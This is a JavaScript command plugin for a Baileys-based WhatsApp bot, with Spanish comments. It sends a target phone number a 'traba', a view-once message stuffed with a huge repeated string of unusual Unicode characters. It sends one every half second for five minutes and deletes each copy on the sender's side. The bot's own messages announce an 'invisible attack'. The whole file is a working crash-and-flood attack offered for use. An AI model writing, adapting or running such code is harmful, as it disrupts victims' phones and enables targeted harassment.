import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn, args }) => {
  if (!m.fromMe) return; // Solo el bot puede usarlo

  const numero = args[0]?.replace(/[^0-9]/g, "");
  if (!numero) return m.reply("⚠️ Debes escribir un número válido. Ej: .trabarios +529991234567");

  const jid = numero + "@s.whatsapp.net";
  const pushname = conn.getName(jid).catch(() => numero);
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const mensajeTraba = {
    viewOnceMessage: {
      message: {
        conversation: "🧪‌⃰Ꮡ‌‌" + 
          "⛧ Zall :: CONCƱΣЯЯOR ⛧" + 
          "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + 
          "𑇂𑆵𑆴𑆿".repeat(60000),
        contextInfo: {
          externalAdReply: {
            title: "⛧ Zall :: CONCƱΣЯЯOR ⛧",
            body: `Haii ${numero}`,
            previewType: "PHOTO",
            thumbnail: null,
            sourceUrl: "https://example.com/tama"
          }
        }
      }
    }
  };

  await conn.sendMessage(m.chat, { text: `⏳ Iniciando ataque invisible a ${numero} por 5 minutos...` }, { quoted: m });

  const start = Date.now();
  const duration = 5 * 60 * 1000;
  let enviados = 0;

  try {
    while (Date.now() - start < duration) {
      const generated = generateWAMessageFromContent(jid, mensajeTraba, {});
      await conn.relayMessage(jid, generated.message, { messageId: generated.key.id });
      await conn.sendMessage(conn.user.id, { delete: generated.key });
      enviados++;
      await delay(500); // Velocidad de ataque
    }

    await conn.sendMessage(m.chat, { text: `✅ Ataque finalizado. Se enviaron ${enviados} trabas invisibles a ${numero}` }, { quoted: m });
  } catch (e) {
    await conn.sendMessage(m.chat, { text: "❌ Error durante el ataque:\n" + e.message }, { quoted: m });
  }
};

handler.command = ["trabarios"];
handler.rowner = true;
export default handler;